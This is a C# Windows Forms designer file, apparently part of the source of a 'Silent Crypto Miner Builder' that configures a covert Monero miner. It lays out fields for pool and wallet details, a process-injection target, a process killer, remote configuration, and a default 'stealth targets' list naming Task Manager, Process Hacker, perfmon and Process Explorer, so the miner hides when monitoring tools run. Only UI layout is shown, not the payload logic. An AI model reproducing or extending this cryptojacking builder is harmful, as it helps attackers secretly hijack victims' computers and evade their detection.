            this.labelMinerAdvancedStealthFullscreen.Name = "labelMinerAdvancedStealthFullscreen";
            this.labelMinerAdvancedStealthFullscreen.Size = new System.Drawing.Size(130, 17);
            this.labelMinerAdvancedStealthFullscreen.TabIndex = 131;
            this.labelMinerAdvancedStealthFullscreen.Text = "Stealth on Fullscreen:";
            // 
            // chkAPI
            // 
            this.chkAPI.AccentColor = System.Drawing.Color.ForestGreen;
            this.chkAPI.BackColor = System.Drawing.Color.Transparent;
            this.chkAPI.Checked = false;
            this.chkAPI.Cursor = System.Windows.Forms.Cursors.Hand;
            this.chkAPI.ForeColor = System.Drawing.Color.Black;
            this.chkAPI.Location = new System.Drawing.Point(227, 68);
            this.chkAPI.Margin = new System.Windows.Forms.Padding(2);
            this.chkAPI.Name = "chkAPI";
            this.chkAPI.Size = new System.Drawing.Size(178, 24);
            this.chkAPI.TabIndex = 129;
            this.chkAPI.Text = "API Endpoint URL";
            this.chkAPI.CheckedChanged += new MephCheckBox.CheckedChangedEventHandler(this.chkAPI_CheckedChanged);
            // 
            // labelMinerAdvancedKillTargets
            // 
            this.labelMinerAdvancedKillTargets.AutoSize = true;
            this.labelMinerAdvancedKillTargets.BackColor = System.Drawing.Color.Transparent;
            this.labelMinerAdvancedKillTargets.ForeColor = System.Drawing.Color.Gray;
            this.labelMinerAdvancedKillTargets.Location = new System.Drawing.Point(14, 133);
            this.labelMinerAdvancedKillTargets.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.labelMinerAdvancedKillTargets.Name = "labelMinerAdvancedKillTargets";
            this.labelMinerAdvancedKillTargets.Size = new System.Drawing.Size(75, 17);
            this.labelMinerAdvancedKillTargets.TabIndex = 125;
            this.labelMinerAdvancedKillTargets.Text = "Kill Targets:";
            // 
            // labelMinerAdvancedStealthTargets
            // 
            this.labelMinerAdvancedStealthTargets.AutoSize = true;
            this.labelMinerAdvancedStealthTargets.BackColor = System.Drawing.Color.Transparent;
            this.labelMinerAdvancedStealthTargets.ForeColor = System.Drawing.Color.Gray;
            this.labelMinerAdvancedStealthTargets.Location = new System.Drawing.Point(14, 77);
            this.labelMinerAdvancedStealthTargets.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.labelMinerAdvancedStealthTargets.Name = "labelMinerAdvancedStealthTargets";
            this.labelMinerAdvancedStealthTargets.Size = new System.Drawing.Size(97, 17);
            this.labelMinerAdvancedStealthTargets.TabIndex = 121;
            this.labelMinerAdvancedStealthTargets.Text = "Stealth Targets:";
            // 
            // chkAdvParam
            // 
            this.chkAdvParam.AccentColor = System.Drawing.Color.ForestGreen;
            this.chkAdvParam.BackColor = System.Drawing.Color.Transparent;
            this.chkAdvParam.Checked = false;
            this.chkAdvParam.Cursor = System.Windows.Forms.Cursors.Hand;
            this.chkAdvParam.ForeColor = System.Drawing.Color.Black;
            this.chkAdvParam.Location = new System.Drawing.Point(227, 124);
            this.chkAdvParam.Margin = new System.Windows.Forms.Padding(2);
            this.chkAdvParam.Name = "chkAdvParam";
            this.chkAdvParam.Size = new System.Drawing.Size(178, 24);
            this.chkAdvParam.TabIndex = 111;
            this.chkAdvParam.Text = "Advanced Parameters";
            this.chkAdvParam.CheckedChanged += new MephCheckBox.CheckedChangedEventHandler(this.chkAdvParam_CheckedChanged);
            // 
            // chkRemoteConfig
            // 
            this.chkRemoteConfig.AccentColor = System.Drawing.Color.ForestGreen;
            this.chkRemoteConfig.BackColor = System.Drawing.Color.Transparent;
            this.chkRemoteConfig.Checked = false;
            this.chkRemoteConfig.Cursor = System.Windows.Forms.Cursors.Hand;
            this.chkRemoteConfig.ForeColor = System.Drawing.Color.Black;
            this.chkRemoteConfig.Location = new System.Drawing.Point(227, 12);
            this.chkRemoteConfig.Margin = new System.Windows.Forms.Padding(2);
            this.chkRemoteConfig.Name = "chkRemoteConfig";
            this.chkRemoteConfig.Size = new System.Drawing.Size(178, 24);
            this.chkRemoteConfig.TabIndex = 115;
            this.chkRemoteConfig.Text = "Remote Configuration";
            this.chkRemoteConfig.CheckedChanged += new MephCheckBox.CheckedChangedEventHandler(this.chkRemoteConfig_CheckedChanged);
            // 
            // txtAPI
            // 
            this.txtAPI.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtAPI.Enabled = false;
            this.txtAPI.ForeColor = System.Drawing.Color.Silver;
            this.txtAPI.Location = new System.Drawing.Point(227, 96);
            this.txtAPI.Margin = new System.Windows.Forms.Padding(2);
            this.txtAPI.MaxLength = 32767;
            this.txtAPI.MultiLine = false;
            this.txtAPI.Name = "txtAPI";
            this.txtAPI.ReadOnly = false;
            this.txtAPI.Size = new System.Drawing.Size(178, 24);
            this.txtAPI.TabIndex = 128;
            this.txtAPI.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtAPI.UseSystemPasswordChar = false;
            this.txtAPI.WordWrap = false;
            // 
            // txtKillTargets
            // 
            this.txtKillTargets.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtKillTargets.ForeColor = System.Drawing.Color.Silver;
            this.txtKillTargets.Location = new System.Drawing.Point(15, 152);
            this.txtKillTargets.Margin = new System.Windows.Forms.Padding(2);
            this.txtKillTargets.MaxLength = 32767;
            this.txtKillTargets.MultiLine = false;
            this.txtKillTargets.Name = "txtKillTargets";
            this.txtKillTargets.ReadOnly = false;
            this.txtKillTargets.Size = new System.Drawing.Size(178, 24);
            this.txtKillTargets.TabIndex = 122;
            this.txtKillTargets.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtKillTargets.UseSystemPasswordChar = false;
            this.txtKillTargets.WordWrap = false;
            // 
            // txtStealthTargets
            // 
            this.txtStealthTargets.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtStealthTargets.ForeColor = System.Drawing.Color.Silver;
            this.txtStealthTargets.Location = new System.Drawing.Point(15, 96);
            this.txtStealthTargets.Margin = new System.Windows.Forms.Padding(2);
            this.txtStealthTargets.MaxLength = 32767;
            this.txtStealthTargets.MultiLine = false;
            this.txtStealthTargets.Name = "txtStealthTargets";
            this.txtStealthTargets.ReadOnly = false;
            this.txtStealthTargets.Size = new System.Drawing.Size(178, 24);
            this.txtStealthTargets.TabIndex = 118;
            this.txtStealthTargets.Text = "Taskmgr.exe,ProcessHacker.exe,perfmon.exe,procexp.exe,procexp64.exe";
            this.txtStealthTargets.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtStealthTargets.UseSystemPasswordChar = false;
            this.txtStealthTargets.WordWrap = false;
            // 
            // txtAdvParam
            // 
            this.txtAdvParam.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtAdvParam.Enabled = false;
            this.txtAdvParam.ForeColor = System.Drawing.Color.Silver;
            this.txtAdvParam.Location = new System.Drawing.Point(227, 152);
            this.txtAdvParam.Margin = new System.Windows.Forms.Padding(2);
            this.txtAdvParam.MaxLength = 32767;
            this.txtAdvParam.MultiLine = false;
            this.txtAdvParam.Name = "txtAdvParam";
            this.txtAdvParam.ReadOnly = false;
            this.txtAdvParam.Size = new System.Drawing.Size(178, 24);
            this.txtAdvParam.TabIndex = 110;
            this.txtAdvParam.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtAdvParam.UseSystemPasswordChar = false;
            this.txtAdvParam.WordWrap = false;
            // 
            // txtRemoteConfig
            // 
            this.txtRemoteConfig.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtRemoteConfig.Enabled = false;
            this.txtRemoteConfig.ForeColor = System.Drawing.Color.Silver;
            this.txtRemoteConfig.Location = new System.Drawing.Point(227, 40);
            this.txtRemoteConfig.Margin = new System.Windows.Forms.Padding(2);
            this.txtRemoteConfig.MaxLength = 32767;
            this.txtRemoteConfig.MultiLine = false;
            this.txtRemoteConfig.Name = "txtRemoteConfig";
            this.txtRemoteConfig.ReadOnly = false;
            this.txtRemoteConfig.Size = new System.Drawing.Size(178, 24);
            this.txtRemoteConfig.TabIndex = 114;
            this.txtRemoteConfig.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtRemoteConfig.UseSystemPasswordChar = false;
            this.txtRemoteConfig.WordWrap = false;
            // 
            // tabJSON
            // 
            this.tabJSON.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.tabJSON.Controls.Add(this.txtJSON);
            this.tabJSON.Location = new System.Drawing.Point(89, 4);
            this.tabJSON.Name = "tabJSON";
            this.tabJSON.Size = new System.Drawing.Size(418, 189);
            this.tabJSON.TabIndex = 8;
            this.tabJSON.Text = "JSON";
            // 
            // txtJSON
            // 
            this.txtJSON.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtJSON.ForeColor = System.Drawing.Color.Silver;
            this.txtJSON.Location = new System.Drawing.Point(3, 3);
            this.txtJSON.MaxLength = 32767;
            this.txtJSON.MultiLine = true;
            this.txtJSON.Name = "txtJSON";
            this.txtJSON.ReadOnly = true;
            this.txtJSON.Size = new System.Drawing.Size(412, 183);
            this.txtJSON.TabIndex = 0;
            this.txtJSON.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtJSON.UseSystemPasswordChar = false;
            this.txtJSON.WordWrap = false;
            // 
            // MinerXMR
            // 
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.None;
            this.ClientSize = new System.Drawing.Size(535, 272);
            this.Controls.Add(this.formMinerXMR);
            this.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
            this.Margin = new System.Windows.Forms.Padding(2);
            this.MaximizeBox = false;
            this.MaximumSize = new System.Drawing.Size(535, 272);
            this.MinimizeBox = false;
            this.MinimumSize = new System.Drawing.Size(535, 272);
            this.Name = "MinerXMR";
            this.Opacity = 0.95D;
            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            this.Text = "Silent Crypto Miner Builder";
            this.TransparencyKey = System.Drawing.Color.Fuchsia;
            this.FormClosing += new System.Windows.Forms.FormClosingEventHandler(this.MinerXMR_FormClosing);
            this.Load += new System.EventHandler(this.Form1_Load);
            this.formMinerXMR.ResumeLayout(false);
            this.tabcontrolMinerXMR.ResumeLayout(false);
            this.tabConnection.ResumeLayout(false);
            this.tabConnection.PerformLayout();
            this.tabMining.ResumeLayout(false);
            this.tabMining.PerformLayout();
            this.tabAdvanced.ResumeLayout(false);
            this.tabAdvanced.PerformLayout();
            this.tabJSON.ResumeLayout(false);
            this.ResumeLayout(false);

        }

        internal MephTheme formMinerXMR;
        internal MephTabcontrol tabcontrolMinerXMR;
        internal TabPage tabConnection;
        internal Label labelMinerInjectTarget;
        internal MephComboBox comboInjection;
        internal Label labelMinerConnectionPool;
        internal MephTextBox txtPoolUsername;
        internal MephTextBox txtPoolURL;
        internal Label labelMinerConnectionWallet;
        internal Label labelMinerConnectionPassword;
        internal MephTextBox txtPoolPassword;
        internal TabPage tabMining;
        internal Label labelMinerMiningStealth;
        internal MephToggleSwitch toggleStealth;
        internal Label labelMinerMiningIdleMinutes;
        internal Label labelMinerMiningIdleWait;
        internal MephTextBox txtIdleWait;
        internal MephComboBox comboIdleCPU;
        internal MephComboBox comboMaxCPU;
        internal Label labelMinerMiningIdleCPU;
        internal Label labelMinerMiningSSL;
        internal MephToggleSwitch toggleSSL;
        internal Label labelMinerMiningNicehash;
        internal MephToggleSwitch toggleNicehash;
        internal Label labelMinerMiningIdle;
        internal Label labelMinerMiningMaxCPU;
        internal TabPage tabAdvanced;
        internal MephCheckBox chkRemoteConfig;
        internal MephTextBox txtRemoteConfig;
        internal MephToggleSwitch toggleIdle;
        internal Label labelMinerAdvancedKillTargets;
        internal MephTextBox txtKillTargets;
        internal Label labelMinerAdvancedStealthTargets;
        internal MephTextBox txtStealthTargets;
        internal MephCheckBox chkAdvParam;
        internal MephTextBox txtAdvParam;
        internal Label labelMinerMiningAlgorithm;
        internal MephComboBox comboAlgorithm;
        internal MephCheckBox chkAPI;
        internal MephTextBox txtAPI;
        internal Label labelMinerMiningProcessKiller;
        internal MephToggleSwitch toggleProcessKiller;
        private TabPage tabJSON;
        private MephTextBox txtJSON;
        internal Label labelMinerAdvancedStealthFullscreen;
        internal MephToggleSwitch toggleStealthFullscreen;
    }
}